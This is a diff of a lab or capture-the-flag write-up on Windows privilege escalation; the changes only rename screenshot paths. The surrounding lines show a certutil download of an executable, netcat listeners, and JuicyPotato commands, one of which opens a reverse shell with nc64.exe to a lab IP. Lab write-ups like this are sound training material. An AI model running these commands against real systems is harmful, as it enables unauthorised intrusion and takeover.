@@ -146,7 +146,7 @@ I realized my reverse shell wasn't working as it is a Windows box. I uploaded a 
 
 
 
-<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (71) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -481,7 +481,7 @@ cd Downloads
 certutil -urlcache -f http://10.10.162.126:81/hhupd.exe hhupd.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (44) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
 
@@ -501,7 +501,7 @@ Open the cmd prompt and it open as an Administrator account, but note if you alr
 
 <figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (33) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation Option #2&#x20;
 
@@ -537,7 +537,7 @@ nc -lvnp 1337
 JuicyPotato.exe -l 1337 -p exploit.exe -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" 
 ```
 
-<figure><img src="../../.gitbook/assets/image (29) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation Option #3&#x20;
 
@@ -574,4 +574,4 @@ nc -lvnp 1337
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\test\nc64.exe -e cmd.exe 10.10.133.11 1337 " -t *  -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" 
 ```
 
-<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (30) (4).png" alt=""><figcaption></figcaption></figure>
